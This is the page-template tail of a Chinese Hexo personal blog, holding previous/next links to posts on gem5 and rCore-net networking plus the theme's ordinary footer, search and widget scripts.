                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

    
        <style>
    .mermaid {
        margin: 10px 0;
        padding: 10px;
        text-align: center; 
    }
</style>

<script src="https://cdn.bootcdn.net/ajax/libs/mermaid/8.11.2/mermaid.min.js"></script>
<script>
    mermaid.initialize({
      startOnLoad: true
      , theme: 'dark'
    });
</script>
    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2021/01/13/Gem5%20%E6%BC%94%E8%AE%B2%E7%A8%BF/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Gem5 演讲稿">
                        
                        <span class="card-title">Gem5 演讲稿</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            本文是 gem5 视频搭配的演讲稿的部分内容视频地址
slides地址
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-13
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Dingsoul
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/sim/">
                        <span class="chip bg-color">sim</span>
                    </a>
                    
                    <a href="/tags/gem5/">
                        <span class="chip bg-color">gem5</span>
                    </a>
                    
                    <a href="/tags/risc-v/">
                        <span class="chip bg-color">risc-v</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2020/09/30/Analysis%20of%20rCore-Net/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="rCore-net 及 smoltcp 分析">
                        
                        <span class="card-title">rCore-net 及 smoltcp 分析</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            本文是 rCore-Net 项目前对于 rCore-net 和 smoltcp 的分析
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-30
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-user fa-fw"></i>
                            Dingsoul
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/risc-v/">
                        <span class="chip bg-color">risc-v</span>
                    </a>
                    
                    <a href="/tags/rCore/">
                        <span class="chip bg-color">rCore</span>
                    </a>
                    
                    <a href="/tags/os/">
                        <span class="chip bg-color">os</span>
                    </a>
                    
                    <a href="/tags/network/">
                        <span class="chip bg-color">network</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    

    <div class="container row center-align"
         style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2021</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">Dingsoul</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
                
            
            
                <span id="busuanzi_container_site_pv">
                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
                    <span id="busuanzi_value_site_pv" class="white-color"></span>
            </span>
            
            
                <span id="busuanzi_container_site_uv">
                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
                    <span id="busuanzi_value_site_uv" class="white-color"></span>
            </span>
            
            <br>

            <!-- 运行天数提醒. -->
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/dingiso" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:dingiso.oah@gmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1037139985" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1037139985" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

    <!--腾讯兔小巢-->
    
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hibiki.model.json"},"display":{"position":"left","width":145,"height":315},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body>

</html>
